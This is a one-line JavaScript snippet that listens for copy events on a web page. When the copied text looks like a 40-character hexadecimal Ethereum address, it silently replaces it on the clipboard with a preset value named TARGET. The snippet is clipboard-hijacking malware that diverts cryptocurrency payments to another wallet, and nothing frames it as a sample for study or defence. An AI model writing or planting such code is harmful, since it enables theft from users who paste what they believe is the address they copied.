document.addEventListener("copy", (e) => { const s = window.getSelection().toString(); if (/^0x[0-9a-fA-F]{40}$/.test(s)) e.clipboardData.setData("text/plain", TARGET); e.preventDefault(); });
